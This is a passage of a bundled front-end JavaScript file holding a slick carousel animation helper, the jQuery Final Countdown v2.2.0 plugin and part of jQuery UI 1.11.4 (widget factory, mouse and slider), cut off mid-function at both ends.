          ? 1e3 * t + 1e3
          : e
          ? 1e3 * e
          : t || e
          ? 1e3 * t + 1e3 * e
          : 1e3;
      }
      function n(t, e, i) {
        var n = {};
        [
          "animation-" + e,
          "-webkit-animation-" + e,
          "-moz-animation-" + e,
          "-o-animation-" + e,
          "-ms-animation-" + e,
        ].forEach(function (t) {
          n[t] = i + "s";
        }),
          t.css(n);
      }
      var s = t(this),
        o = s.find(".slick-list .slick-track > div"),
        r = s.find('[data-slick-index="0"]'),
        a = "animated",
        l = { opacity: "1" },
        c = { opacity: "0" };
      return (
        o.each(function () {
          var o = t(this);
          o.find("[data-animation-in]").each(function () {
            var u = t(this);
            u.css(c);
            var d = u.attr("data-animation-in"),
              h = u.attr("data-animation-out"),
              p = u.attr("data-delay-in"),
              f = u.attr("data-duration-in"),
              g = u.attr("data-delay-out"),
              m = u.attr("data-duration-out");
            h
              ? (r.length > 0 &&
                  o.hasClass("slick-current") &&
                  (e(u, l, d, a, !0),
                  p && n(u, "delay", p),
                  f && n(u, "duration", f),
                  setTimeout(function () {
                    e(u, c, d, a),
                      e(u, l, h, a),
                      g && n(u, "delay", g),
                      m && n(u, "duration", m);
                  }, i(p, f))),
                s.on("afterChange", function (t, s, r) {
                  o.hasClass("slick-current") &&
                    (e(u, l, d, a, !0),
                    p && n(u, "delay", p),
                    f && n(u, "duration", f),
                    setTimeout(function () {
                      e(u, c, d, a),
                        e(u, l, h, a),
                        g && n(u, "delay", g),
                        m && n(u, "duration", m);
                    }, i(p, f)));
                }),
                s.on("beforeChange", function (t, i, n) {
                  e(u, c, h, a, !0);
                }))
              : (r.length > 0 &&
                  o.hasClass("slick-current") &&
                  (e(u, l, d, a, !0),
                  p && n(u, "delay", p),
                  f && n(u, "duration", f)),
                s.on("afterChange", function (t, i, s) {
                  o.hasClass("slick-current") &&
                    (e(u, l, d, a, !0),
                    p && n(u, "delay", p),
                    f && n(u, "duration", f));
                }),
                s.on("beforeChange", function (t, i, n) {
                  e(u, c, d, a, !0);
                }));
          });
        }),
        this
      );
    };
  })(jQuery),
  /*!
   * The Final Countdown for jQuery v2.2.0 (http://hilios.github.io/jQuery.countdown/)
   * Copyright (c) 2016 Edson Hilios
   *
   * Permission is hereby granted, free of charge, to any person obtaining a copy of
   * this software and associated documentation files (the "Software"), to deal in
   * the Software without restriction, including without limitation the rights to
   * use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of
   * the Software, and to permit persons to whom the Software is furnished to do so,
   * subject to the following conditions:
   *
   * The above copyright notice and this permission notice shall be included in all
   * copies or substantial portions of the Software.
   *
   * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
   * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS
   * FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR
   * COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER
   * IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
   * CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
   */ (function (t) {
    "use strict";
    "function" == typeof define && define.amd
      ? define(["jquery"], t)
      : t(jQuery);
  })(function (t) {
    "use strict";
    function e(t) {
      var e = t.toString().replace(/([.?*+^$[\]\\(){}|-])/g, "\\$1");
      return new RegExp(e);
    }
    function i(t) {
      return function (i) {
        var s = i.match(/%(-|!)?[A-Z]{1}(:[^;]+;)?/gi);
        if (s)
          for (var o = 0, r = s.length; o < r; ++o) {
            var l = s[o].match(/%(-|!)?([a-zA-Z]{1})(:[^;]+;)?/),
              c = e(l[0]),
              u = l[1] || "",
              d = l[3] || "",
              h = null;
            (l = l[2]),
              a.hasOwnProperty(l) && ((h = a[l]), (h = Number(t[h]))),
              null !== h &&
                ("!" === u && (h = n(d, h)),
                "" === u && h < 10 && (h = "0" + h.toString()),
                (i = i.replace(c, h.toString())));
          }
        return i.replace(/%%/, "%");
      };
    }
    function n(t, e) {
      var i = "s",
        n = "";
      return (
        t &&
          (1 === (t = t.replace(/(:|;|\s)/gi, "").split(/\,/)).length
            ? (i = t[0])
            : ((n = t[0]), (i = t[1]))),
        Math.abs(e) > 1 ? i : n
      );
    }
    var s = [],
      o = [],
      r = { precision: 100, elapse: !1, defer: !1 };
    o.push(/^[0-9]*$/.source),
      o.push(/([0-9]{1,2}\/){2}[0-9]{4}( [0-9]{1,2}(:[0-9]{2}){2})?/.source),
      o.push(
        /[0-9]{4}([\/\-][0-9]{1,2}){2}( [0-9]{1,2}(:[0-9]{2}){2})?/.source
      ),
      (o = new RegExp(o.join("|")));
    var a = {
        Y: "years",
        m: "months",
        n: "daysToMonth",
        d: "daysToWeek",
        w: "weeks",
        W: "weeksToMonth",
        H: "hours",
        M: "minutes",
        S: "seconds",
        D: "totalDays",
        I: "totalHours",
        N: "totalMinutes",
        T: "totalSeconds",
      },
      l = function (e, i, n) {
        (this.el = e),
          (this.$el = t(e)),
          (this.interval = null),
          (this.offset = {}),
          (this.options = t.extend({}, r)),
          (this.firstTick = !0),
          (this.instanceNumber = s.length),
          s.push(this),
          this.$el.data("countdown-instance", this.instanceNumber),
          n &&
            ("function" == typeof n
              ? (this.$el.on("update.countdown", n),
                this.$el.on("stoped.countdown", n),
                this.$el.on("finish.countdown", n))
              : (this.options = t.extend({}, r, n))),
          this.setFinalDate(i),
          !1 === this.options.defer && this.start();
      };
    t.extend(l.prototype, {
      start: function () {
        null !== this.interval && clearInterval(this.interval);
        var t = this;
        this.update(),
          (this.interval = setInterval(function () {
            t.update.call(t);
          }, this.options.precision));
      },
      stop: function () {
        clearInterval(this.interval),
          (this.interval = null),
          this.dispatchEvent("stoped");
      },
      toggle: function () {
        this.interval ? this.stop() : this.start();
      },
      pause: function () {
        this.stop();
      },
      resume: function () {
        this.start();
      },
      remove: function () {
        this.stop.call(this),
          (s[this.instanceNumber] = null),
          delete this.$el.data().countdownInstance;
      },
      setFinalDate: function (t) {
        this.finalDate = (function (t) {
          if (t instanceof Date) return t;
          if (String(t).match(o))
            return (
              String(t).match(/^[0-9]*$/) && (t = Number(t)),
              String(t).match(/\-/) && (t = String(t).replace(/\-/g, "/")),
              new Date(t)
            );
          throw new Error("Couldn't cast `" + t + "` to a date object.");
        })(t);
      },
      update: function () {
        if (0 !== this.$el.closest("html").length) {
          var t,
            e = new Date();
          return (
            (t = this.finalDate.getTime() - e.getTime()),
            (t = Math.ceil(t / 1e3)),
            (t = !this.options.elapse && t < 0 ? 0 : Math.abs(t)),
            this.totalSecsLeft === t || this.firstTick
              ? void (this.firstTick = !1)
              : ((this.totalSecsLeft = t),
                (this.elapsed = e >= this.finalDate),
                (this.offset = {
                  seconds: this.totalSecsLeft % 60,
                  minutes: Math.floor(this.totalSecsLeft / 60) % 60,
                  hours: Math.floor(this.totalSecsLeft / 60 / 60) % 24,
                  days: Math.floor(this.totalSecsLeft / 60 / 60 / 24) % 7,
                  daysToWeek: Math.floor(this.totalSecsLeft / 60 / 60 / 24) % 7,
                  daysToMonth: Math.floor(
                    (this.totalSecsLeft / 60 / 60 / 24) % 30.4368
                  ),
                  weeks: Math.floor(this.totalSecsLeft / 60 / 60 / 24 / 7),
                  weeksToMonth:
                    Math.floor(this.totalSecsLeft / 60 / 60 / 24 / 7) % 4,
                  months: Math.floor(
                    this.totalSecsLeft / 60 / 60 / 24 / 30.4368
                  ),
                  years: Math.abs(
                    this.finalDate.getFullYear() - e.getFullYear()
                  ),
                  totalDays: Math.floor(this.totalSecsLeft / 60 / 60 / 24),
                  totalHours: Math.floor(this.totalSecsLeft / 60 / 60),
                  totalMinutes: Math.floor(this.totalSecsLeft / 60),
                  totalSeconds: this.totalSecsLeft,
                }),
                void (this.options.elapse || 0 !== this.totalSecsLeft
                  ? this.dispatchEvent("update")
                  : (this.stop(), this.dispatchEvent("finish"))))
          );
        }
        this.remove();
      },
      dispatchEvent: function (e) {
        var n = t.Event(e + ".countdown");
        (n.finalDate = this.finalDate),
          (n.elapsed = this.elapsed),
          (n.offset = t.extend({}, this.offset)),
          (n.strftime = i(this.offset)),
          this.$el.trigger(n);
      },
    }),
      (t.fn.countdown = function () {
        var e = Array.prototype.slice.call(arguments, 0);
        return this.each(function () {
          var i = t(this).data("countdown-instance");
          if (void 0 !== i) {
            var n = s[i],
              o = e[0];
            l.prototype.hasOwnProperty(o)
              ? n[o].apply(n, e.slice(1))
              : null === String(o).match(/^[$A-Z_][0-9A-Z_$]*$/i)
              ? (n.setFinalDate.call(n, o), n.start())
              : t.error(
                  "Method %s does not exist on jQuery.countdown".replace(
                    /\%s/gi,
                    o
                  )
                );
          } else new l(this, e[0], e[1]);
        });
      });
  }),
  /*! jQuery UI - v1.11.4 - 2016-06-07
   * http://jqueryui.com
   * Includes: core.js, widget.js, mouse.js, slider.js
   * Copyright jQuery Foundation and other contributors; Licensed MIT */
  (function (t) {
    "function" == typeof define && define.amd
      ? define(["jquery"], t)
      : t(jQuery);
  })(function (t) {
    function e(e, n) {
      var s,
        o,
        r,
        a = e.nodeName.toLowerCase();
      return "area" === a
        ? ((o = (s = e.parentNode).name),
          !(!e.href || !o || "map" !== s.nodeName.toLowerCase()) &&
            !!(r = t("img[usemap='#" + o + "']")[0]) &&
            i(r))
        : (/^(input|select|textarea|button|object)$/.test(a)
            ? !e.disabled
            : ("a" === a && e.href) || n) && i(e);
    }
    function i(e) {
      return (
        t.expr.filters.visible(e) &&
        !t(e)
          .parents()
          .addBack()
          .filter(function () {
            return "hidden" === t.css(this, "visibility");
          }).length
      );
    }
    (t.ui = t.ui || {}),
      t.extend(t.ui, {
        version: "1.11.4",
        keyCode: {
          BACKSPACE: 8,
          COMMA: 188,
          DELETE: 46,
          DOWN: 40,
          END: 35,
          ENTER: 13,
          ESCAPE: 27,
          HOME: 36,
          LEFT: 37,
          PAGE_DOWN: 34,
          PAGE_UP: 33,
          PERIOD: 190,
          RIGHT: 39,
          SPACE: 32,
          TAB: 9,
          UP: 38,
        },
      }),
      t.fn.extend({
        scrollParent: function (e) {
          var i = this.css("position"),
            n = "absolute" === i,
            s = e ? /(auto|scroll|hidden)/ : /(auto|scroll)/,
            o = this.parents()
              .filter(function () {
                var e = t(this);
                return (
                  (!n || "static" !== e.css("position")) &&
                  s.test(
                    e.css("overflow") +
                      e.css("overflow-y") +
                      e.css("overflow-x")
                  )
                );
              })
              .eq(0);
          return "fixed" !== i && o.length
            ? o
            : t(this[0].ownerDocument || document);
        },
        uniqueId: (function () {
          var t = 0;
          return function () {
            return this.each(function () {
              this.id || (this.id = "ui-id-" + ++t);
            });
          };
        })(),
        removeUniqueId: function () {
          return this.each(function () {
            /^ui-id-\d+$/.test(this.id) && t(this).removeAttr("id");
          });
        },
      }),
      t.extend(t.expr[":"], {
        data: t.expr.createPseudo
          ? t.expr.createPseudo(function (e) {
              return function (i) {
                return !!t.data(i, e);
              };
            })
          : function (e, i, n) {
              return !!t.data(e, n[3]);
            },
        focusable: function (i) {
          return e(i, !isNaN(t.attr(i, "tabindex")));
        },
        tabbable: function (i) {
          var n = t.attr(i, "tabindex"),
            s = isNaN(n);
          return (s || n >= 0) && e(i, !s);
        },
      }),
      t("<a>").outerWidth(1).jquery ||
        t.each(["Width", "Height"], function (e, i) {
          function n(e, i, n, o) {
            return (
              t.each(s, function () {
                (i -= parseFloat(t.css(e, "padding" + this)) || 0),
                  n &&
                    (i -= parseFloat(t.css(e, "border" + this + "Width")) || 0),
                  o && (i -= parseFloat(t.css(e, "margin" + this)) || 0);
              }),
              i
            );
          }
          var s = "Width" === i ? ["Left", "Right"] : ["Top", "Bottom"],
            o = i.toLowerCase(),
            r = {
              innerWidth: t.fn.innerWidth,
              innerHeight: t.fn.innerHeight,
              outerWidth: t.fn.outerWidth,
              outerHeight: t.fn.outerHeight,
            };
          (t.fn["inner" + i] = function (e) {
            return void 0 === e
              ? r["inner" + i].call(this)
              : this.each(function () {
                  t(this).css(o, n(this, e) + "px");
                });
          }),
            (t.fn["outer" + i] = function (e, s) {
              return "number" != typeof e
                ? r["outer" + i].call(this, e)
                : this.each(function () {
                    t(this).css(o, n(this, e, !0, s) + "px");
                  });
            });
        }),
      t.fn.addBack ||
        (t.fn.addBack = function (t) {
          return this.add(
            null == t ? this.prevObject : this.prevObject.filter(t)
          );
        }),
      t("<a>").data("a-b", "a").removeData("a-b").data("a-b") &&
        (t.fn.removeData = (function (e) {
          return function (i) {
            return arguments.length
              ? e.call(this, t.camelCase(i))
              : e.call(this);
          };
        })(t.fn.removeData)),
      (t.ui.ie = !!/msie [\w.]+/.exec(navigator.userAgent.toLowerCase())),
      t.fn.extend({
        focus: (function (e) {
          return function (i, n) {
            return "number" == typeof i
              ? this.each(function () {
                  var e = this;
                  setTimeout(function () {
                    t(e).focus(), n && n.call(e);
                  }, i);
                })
              : e.apply(this, arguments);
          };
        })(t.fn.focus),
        disableSelection: (function () {
          var t =
            "onselectstart" in document.createElement("div")
              ? "selectstart"
              : "mousedown";
          return function () {
            return this.bind(t + ".ui-disableSelection", function (t) {
              t.preventDefault();
            });
          };
        })(),
        enableSelection: function () {
          return this.unbind(".ui-disableSelection");
        },
        zIndex: function (e) {
          if (void 0 !== e) return this.css("zIndex", e);
          if (this.length)
            for (var i, n, s = t(this[0]); s.length && s[0] !== document; ) {
              if (
                ("absolute" === (i = s.css("position")) ||
                  "relative" === i ||
                  "fixed" === i) &&
                ((n = parseInt(s.css("zIndex"), 10)), !isNaN(n) && 0 !== n)
              )
                return n;
              s = s.parent();
            }
          return 0;
        },
      }),
      (t.ui.plugin = {
        add: function (e, i, n) {
          var s,
            o = t.ui[e].prototype;
          for (s in n)
            (o.plugins[s] = o.plugins[s] || []), o.plugins[s].push([i, n[s]]);
        },
        call: function (t, e, i, n) {
          var s,
            o = t.plugins[e];
          if (
            o &&
            (n ||
              (t.element[0].parentNode &&
                11 !== t.element[0].parentNode.nodeType))
          )
            for (s = 0; o.length > s; s++)
              t.options[o[s][0]] && o[s][1].apply(t.element, i);
        },
      });
    var n = 0,
      s = Array.prototype.slice;
    (t.cleanData = (function (e) {
      return function (i) {
        var n, s, o;
        for (o = 0; null != (s = i[o]); o++)
          try {
            (n = t._data(s, "events")) &&
              n.remove &&
              t(s).triggerHandler("remove");
          } catch (t) {}
        e(i);
      };
    })(t.cleanData)),
      (t.widget = function (e, i, n) {
        var s,
          o,
          r,
          a,
          l = {},
          c = e.split(".")[0];
        return (
          (e = e.split(".")[1]),
          (s = c + "-" + e),
          n || ((n = i), (i = t.Widget)),
          (t.expr[":"][s.toLowerCase()] = function (e) {
            return !!t.data(e, s);
          }),
          (t[c] = t[c] || {}),
          (o = t[c][e]),
          (r = t[c][e] =
            function (t, e) {
              return this._createWidget
                ? void (arguments.length && this._createWidget(t, e))
                : new r(t, e);
            }),
          t.extend(r, o, {
            version: n.version,
            _proto: t.extend({}, n),
            _childConstructors: [],
          }),
          ((a = new i()).options = t.widget.extend({}, a.options)),
          t.each(n, function (e, n) {
            return t.isFunction(n)
              ? void (l[e] = (function () {
                  var t = function () {
                      return i.prototype[e].apply(this, arguments);
                    },
                    s = function (t) {
                      return i.prototype[e].apply(this, t);
                    };
                  return function () {
                    var e,
                      i = this._super,
                      o = this._superApply;
                    return (
                      (this._super = t),
                      (this._superApply = s),
                      (e = n.apply(this, arguments)),
                      (this._super = i),
                      (this._superApply = o),
                      e
                    );
                  };
                })())
              : void (l[e] = n);
          }),
          (r.prototype = t.widget.extend(
            a,
            { widgetEventPrefix: (o && a.widgetEventPrefix) || e },
            l,
            { constructor: r, namespace: c, widgetName: e, widgetFullName: s }
          )),
          o
            ? (t.each(o._childConstructors, function (e, i) {
                var n = i.prototype;
                t.widget(n.namespace + "." + n.widgetName, r, i._proto);
              }),
              delete o._childConstructors)
            : i._childConstructors.push(r),
          t.widget.bridge(e, r),
          r
        );
      }),
      (t.widget.extend = function (e) {
        for (
          var i, n, o = s.call(arguments, 1), r = 0, a = o.length;
          a > r;
          r++
        )
          for (i in o[r])
            (n = o[r][i]),
              o[r].hasOwnProperty(i) &&
                void 0 !== n &&
                (e[i] = t.isPlainObject(n)
                  ? t.isPlainObject(e[i])
                    ? t.widget.extend({}, e[i], n)
                    : t.widget.extend({}, n)
                  : n);
        return e;
      }),
      (t.widget.bridge = function (e, i) {
        var n = i.prototype.widgetFullName || e;
        t.fn[e] = function (o) {
          var r = "string" == typeof o,
            a = s.call(arguments, 1),
            l = this;
          return (
            r
              ? this.each(function () {
                  var i,
                    s = t.data(this, n);
                  return "instance" === o
                    ? ((l = s), !1)
                    : s
                    ? t.isFunction(s[o]) && "_" !== o.charAt(0)
                      ? (i = s[o].apply(s, a)) !== s && void 0 !== i
                        ? ((l = i && i.jquery ? l.pushStack(i.get()) : i), !1)
                        : void 0
                      : t.error(
                          "no such method '" +
                            o +
                            "' for " +
                            e +
                            " widget instance"
                        )
                    : t.error(
                        "cannot call methods on " +
                          e +
                          " prior to initialization; attempted to call method '" +
                          o +
                          "'"
                      );
                })
              : (a.length && (o = t.widget.extend.apply(null, [o].concat(a))),
                this.each(function () {
                  var e = t.data(this, n);
                  e
                    ? (e.option(o || {}), e._init && e._init())
                    : t.data(this, n, new i(o, this));
                })),
            l
          );
        };
      }),
      (t.Widget = function () {}),
      (t.Widget._childConstructors = []),
      (t.Widget.prototype = {
        widgetName: "widget",
        widgetEventPrefix: "",
        defaultElement: "<div>",
        options: { disabled: !1, create: null },
        _createWidget: function (e, i) {
          (i = t(i || this.defaultElement || this)[0]),
            (this.element = t(i)),
            (this.uuid = n++),
            (this.eventNamespace = "." + this.widgetName + this.uuid),
            (this.bindings = t()),
            (this.hoverable = t()),
            (this.focusable = t()),
            i !== this &&
              (t.data(i, this.widgetFullName, this),
              this._on(!0, this.element, {
                remove: function (t) {
                  t.target === i && this.destroy();
                },
              }),
              (this.document = t(i.style ? i.ownerDocument : i.document || i)),
              (this.window = t(
                this.document[0].defaultView || this.document[0].parentWindow
              ))),
            (this.options = t.widget.extend(
              {},
              this.options,
              this._getCreateOptions(),
              e
            )),
            this._create(),
            this._trigger("create", null, this._getCreateEventData()),
            this._init();
        },
        _getCreateOptions: t.noop,
        _getCreateEventData: t.noop,
        _create: t.noop,
        _init: t.noop,
        destroy: function () {
          this._destroy(),
            this.element
              .unbind(this.eventNamespace)
              .removeData(this.widgetFullName)
              .removeData(t.camelCase(this.widgetFullName)),
            this.widget()
              .unbind(this.eventNamespace)
              .removeAttr("aria-disabled")
              .removeClass(this.widgetFullName + "-disabled ui-state-disabled"),
            this.bindings.unbind(this.eventNamespace),
            this.hoverable.removeClass("ui-state-hover"),
            this.focusable.removeClass("ui-state-focus");
        },
        _destroy: t.noop,
        widget: function () {
          return this.element;
        },
        option: function (e, i) {
          var n,
            s,
            o,
            r = e;
          if (0 === arguments.length) return t.widget.extend({}, this.options);
          if ("string" == typeof e)
            if (((r = {}), (n = e.split(".")), (e = n.shift()), n.length)) {
              for (
                s = r[e] = t.widget.extend({}, this.options[e]), o = 0;
                n.length - 1 > o;
                o++
              )
                (s[n[o]] = s[n[o]] || {}), (s = s[n[o]]);
              if (((e = n.pop()), 1 === arguments.length))
                return void 0 === s[e] ? null : s[e];
              s[e] = i;
            } else {
              if (1 === arguments.length)
                return void 0 === this.options[e] ? null : this.options[e];
              r[e] = i;
            }
          return this._setOptions(r), this;
        },
        _setOptions: function (t) {
          var e;
          for (e in t) this._setOption(e, t[e]);
          return this;
        },
        _setOption: function (t, e) {
          return (
            (this.options[t] = e),
            "disabled" === t &&
              (this.widget().toggleClass(
                this.widgetFullName + "-disabled",
                !!e
              ),
              e &&
                (this.hoverable.removeClass("ui-state-hover"),
                this.focusable.removeClass("ui-state-focus"))),
            this
          );
        },
        enable: function () {
          return this._setOptions({ disabled: !1 });
        },
        disable: function () {
          return this._setOptions({ disabled: !0 });
        },
        _on: function (e, i, n) {
          var s,
            o = this;
          "boolean" != typeof e && ((n = i), (i = e), (e = !1)),
            n
              ? ((i = s = t(i)), (this.bindings = this.bindings.add(i)))
              : ((n = i), (i = this.element), (s = this.widget())),
            t.each(n, function (n, r) {
              function a() {
                return e ||
                  (!0 !== o.options.disabled &&
                    !t(this).hasClass("ui-state-disabled"))
                  ? ("string" == typeof r ? o[r] : r).apply(o, arguments)
                  : void 0;
              }
              "string" != typeof r &&
                (a.guid = r.guid = r.guid || a.guid || t.guid++);
              var l = n.match(/^([\w:-]*)\s*(.*)$/),
                c = l[1] + o.eventNamespace,
                u = l[2];
              u ? s.delegate(u, c, a) : i.bind(c, a);
            });
        },
        _off: function (e, i) {
          (i =
            (i || "").split(" ").join(this.eventNamespace + " ") +
            this.eventNamespace),
            e.unbind(i).undelegate(i),
            (this.bindings = t(this.bindings.not(e).get())),
            (this.focusable = t(this.focusable.not(e).get())),
            (this.hoverable = t(this.hoverable.not(e).get()));
        },
        _delay: function (t, e) {
          var i = this;
          return setTimeout(function () {
            return ("string" == typeof t ? i[t] : t).apply(i, arguments);
          }, e || 0);
        },
        _hoverable: function (e) {
          (this.hoverable = this.hoverable.add(e)),
            this._on(e, {
              mouseenter: function (e) {
                t(e.currentTarget).addClass("ui-state-hover");
              },
              mouseleave: function (e) {
                t(e.currentTarget).removeClass("ui-state-hover");
              },
            });
        },
        _focusable: function (e) {
          (this.focusable = this.focusable.add(e)),
            this._on(e, {
              focusin: function (e) {
                t(e.currentTarget).addClass("ui-state-focus");
              },
              focusout: function (e) {
                t(e.currentTarget).removeClass("ui-state-focus");
              },
            });
        },
        _trigger: function (e, i, n) {
          var s,
            o,
            r = this.options[e];
          if (
            ((n = n || {}),
            ((i = t.Event(i)).type = (
              e === this.widgetEventPrefix ? e : this.widgetEventPrefix + e
            ).toLowerCase()),
            (i.target = this.element[0]),
            (o = i.originalEvent))
          )
            for (s in o) s in i || (i[s] = o[s]);
          return (
            this.element.trigger(i, n),
            !(
              (t.isFunction(r) &&
                !1 === r.apply(this.element[0], [i].concat(n))) ||
              i.isDefaultPrevented()
            )
          );
        },
      }),
      t.each({ show: "fadeIn", hide: "fadeOut" }, function (e, i) {
        t.Widget.prototype["_" + e] = function (n, s, o) {
          "string" == typeof s && (s = { effect: s });
          var r,
            a = s ? (!0 === s || "number" == typeof s ? i : s.effect || i) : e;
          "number" == typeof (s = s || {}) && (s = { duration: s }),
            (r = !t.isEmptyObject(s)),
            (s.complete = o),
            s.delay && n.delay(s.delay),
            r && t.effects && t.effects.effect[a]
              ? n[e](s)
              : a !== e && n[a]
              ? n[a](s.duration, s.easing, o)
              : n.queue(function (i) {
                  t(this)[e](), o && o.call(n[0]), i();
                });
        };
      }),
      t.widget;
    var o = !1;
    t(document).mouseup(function () {
      o = !1;
    }),
      t.widget("ui.mouse", {
        version: "1.11.4",
        options: {
          cancel: "input,textarea,button,select,option",
          distance: 1,
          delay: 0,
        },
        _mouseInit: function () {
          var e = this;
          this.element
            .bind("mousedown." + this.widgetName, function (t) {
              return e._mouseDown(t);
            })
            .bind("click." + this.widgetName, function (i) {
              return !0 ===
                t.data(i.target, e.widgetName + ".preventClickEvent")
                ? (t.removeData(i.target, e.widgetName + ".preventClickEvent"),
                  i.stopImmediatePropagation(),
                  !1)
                : void 0;
            }),
            (this.started = !1);
        },
        _mouseDestroy: function () {
          this.element.unbind("." + this.widgetName),
            this._mouseMoveDelegate &&
              this.document
                .unbind("mousemove." + this.widgetName, this._mouseMoveDelegate)
                .unbind("mouseup." + this.widgetName, this._mouseUpDelegate);
        },
        _mouseDown: function (e) {
          if (!o) {
            (this._mouseMoved = !1),
              this._mouseStarted && this._mouseUp(e),
              (this._mouseDownEvent = e);
            var i = this,
              n = 1 === e.which,
              s =
                !(
                  "string" != typeof this.options.cancel || !e.target.nodeName
                ) && t(e.target).closest(this.options.cancel).length;
            return (
              !(n && !s && this._mouseCapture(e)) ||
              ((this.mouseDelayMet = !this.options.delay),
              this.mouseDelayMet ||
                (this._mouseDelayTimer = setTimeout(function () {
                  i.mouseDelayMet = !0;
                }, this.options.delay)),
              this._mouseDistanceMet(e) &&
              this._mouseDelayMet(e) &&
              ((this._mouseStarted = !1 !== this._mouseStart(e)),
              !this._mouseStarted)
                ? (e.preventDefault(), !0)
                : (!0 ===
                    t.data(e.target, this.widgetName + ".preventClickEvent") &&
                    t.removeData(
                      e.target,
                      this.widgetName + ".preventClickEvent"
                    ),
                  (this._mouseMoveDelegate = function (t) {
                    return i._mouseMove(t);
                  }),
                  (this._mouseUpDelegate = function (t) {
                    return i._mouseUp(t);
                  }),
                  this.document
                    .bind(
                      "mousemove." + this.widgetName,
                      this._mouseMoveDelegate
                    )
                    .bind("mouseup." + this.widgetName, this._mouseUpDelegate),
                  e.preventDefault(),
                  (o = !0),
                  !0))
            );
          }
        },
        _mouseMove: function (e) {
          if (this._mouseMoved) {
            if (
              t.ui.ie &&
              (!document.documentMode || 9 > document.documentMode) &&
              !e.button
            )
              return this._mouseUp(e);
            if (!e.which) return this._mouseUp(e);
          }
          return (
            (e.which || e.button) && (this._mouseMoved = !0),
            this._mouseStarted
              ? (this._mouseDrag(e), e.preventDefault())
              : (this._mouseDistanceMet(e) &&
                  this._mouseDelayMet(e) &&
                  ((this._mouseStarted =
                    !1 !== this._mouseStart(this._mouseDownEvent, e)),
                  this._mouseStarted ? this._mouseDrag(e) : this._mouseUp(e)),
                !this._mouseStarted)
          );
        },
        _mouseUp: function (e) {
          return (
            this.document
              .unbind("mousemove." + this.widgetName, this._mouseMoveDelegate)
              .unbind("mouseup." + this.widgetName, this._mouseUpDelegate),
            this._mouseStarted &&
              ((this._mouseStarted = !1),
              e.target === this._mouseDownEvent.target &&
                t.data(e.target, this.widgetName + ".preventClickEvent", !0),
              this._mouseStop(e)),
            (o = !1),
            !1
          );
        },
        _mouseDistanceMet: function (t) {
          return (
            Math.max(
              Math.abs(this._mouseDownEvent.pageX - t.pageX),
              Math.abs(this._mouseDownEvent.pageY - t.pageY)
            ) >= this.options.distance
          );
        },
        _mouseDelayMet: function () {
          return this.mouseDelayMet;
        },
        _mouseStart: function () {},
        _mouseDrag: function () {},
        _mouseStop: function () {},
        _mouseCapture: function () {
          return !0;
        },
      }),
      t.widget("ui.slider", t.ui.mouse, {
        version: "1.11.4",
        widgetEventPrefix: "slide",
        options: {
          animate: !1,
          distance: 0,
          max: 100,
          min: 0,
          orientation: "horizontal",
          range: !1,
          step: 1,
          value: 0,
          values: null,
          change: null,
          slide: null,
          start: null,
          stop: null,
        },
        numPages: 5,
        _create: function () {
          (this._keySliding = !1),
            (this._mouseSliding = !1),
            (this._animateOff = !0),
            (this._handleIndex = null),
            this._detectOrientation(),
            this._mouseInit(),
            this._calculateNewMax(),
            this.element.addClass(
              "ui-slider ui-slider-" +
                this.orientation +
                " ui-widget ui-widget-content ui-corner-all"
            ),
            this._refresh(),
            this._setOption("disabled", this.options.disabled),
            (this._animateOff = !1);
        },
        _refresh: function () {
          this._createRange(),
            this._createHandles(),
            this._setupEvents(),
            this._refreshValue();
        },
        _createHandles: function () {
          var e,
            i,
            n = this.options,
            s = this.element
              .find(".ui-slider-handle")
              .addClass("ui-state-default ui-corner-all"),
            o = [];
          for (
            i = (n.values && n.values.length) || 1,
              s.length > i && (s.slice(i).remove(), (s = s.slice(0, i))),
              e = s.length;
            i > e;
            e++
          )
            o.push(
              "<span class='ui-slider-handle ui-state-default ui-corner-all' tabindex='0'></span>"
            );
          (this.handles = s.add(t(o.join("")).appendTo(this.element))),
            (this.handle = this.handles.eq(0)),
            this.handles.each(function (e) {
              t(this).data("ui-slider-handle-index", e);
            });
        },
        _createRange: function () {
          var e = this.options,
            i = "";
          e.range
            ? (!0 === e.range &&
                (e.values
                  ? e.values.length && 2 !== e.values.length
                    ? (e.values = [e.values[0], e.values[0]])
                    : t.isArray(e.values) && (e.values = e.values.slice(0))
                  : (e.values = [this._valueMin(), this._valueMin()])),
              this.range && this.range.length
                ? this.range
                    .removeClass("ui-slider-range-min ui-slider-range-max")
                    .css({ left: "", bottom: "" })
                : ((this.range = t("<div></div>").appendTo(this.element)),
                  (i = "ui-slider-range ui-widget-header ui-corner-all")),
              this.range.addClass(
                i +
                  ("min" === e.range || "max" === e.range
                    ? " ui-slider-range-" + e.range
                    : "")
              ))
            : (this.range && this.range.remove(), (this.range = null));
        },
        _setupEvents: function () {
          this._off(this.handles),
            this._on(this.handles, this._handleEvents),
            this._hoverable(this.handles),
            this._focusable(this.handles);
        },
        _destroy: function () {
          this.handles.remove(),
            this.range && this.range.remove(),
            this.element.removeClass(
              "ui-slider ui-slider-horizontal ui-slider-vertical ui-widget ui-widget-content ui-corner-all"
            ),
            this._mouseDestroy();
        },
        _mouseCapture: function (e) {
          var i,
            n,
            s,
            o,
            r,
            a,
            l,
            c = this,
            u = this.options;
          return (
            !u.disabled &&
            ((this.elementSize = {
              width: this.element.outerWidth(),
              height: this.element.outerHeight(),
            }),
            (this.elementOffset = this.element.offset()),
            (i = { x: e.pageX, y: e.pageY }),
            (n = this._normValueFromMouse(i)),
            (s = this._valueMax() - this._valueMin() + 1),
            this.handles.each(function (e) {
              var i = Math.abs(n - c.values(e));
              (s > i ||
                (s === i &&
                  (e === c._lastChangedValue || c.values(e) === u.min))) &&
                ((s = i), (o = t(this)), (r = e));
            }),
            !1 !== this._start(e, r) &&
              ((this._mouseSliding = !0),
              (this._handleIndex = r),
              o.addClass("ui-state-active").focus(),
              (a = o.offset()),
              (l = !t(e.target).parents().addBack().is(".ui-slider-handle")),
              (this._clickOffset = l
                ? { left: 0, top: 0 }
                : {
